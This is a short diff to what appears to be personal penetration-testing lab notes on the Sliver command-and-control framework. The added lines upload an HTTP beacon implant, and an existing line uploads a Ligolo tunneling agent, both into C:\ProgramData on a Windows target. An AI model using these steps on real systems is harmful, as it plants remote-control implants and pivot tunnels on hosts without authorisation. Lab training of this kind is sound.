@@ -141,6 +141,11 @@ sliver > help
 # Upload a file, note the double slashes
 upload /home/kali/work/prolab/ligolo/ligolo-windows-agent.exe C:\\ProgramData\\ligolo-windows-agent.exe
 
+# Upload a beacon
+upload /home/kali/work/prolab/sliver/httpbeacon80fast.exe C:\\ProgramData\\fast.exe
+
+# Execute that Beacon
+
 # Run a command
 
 ```
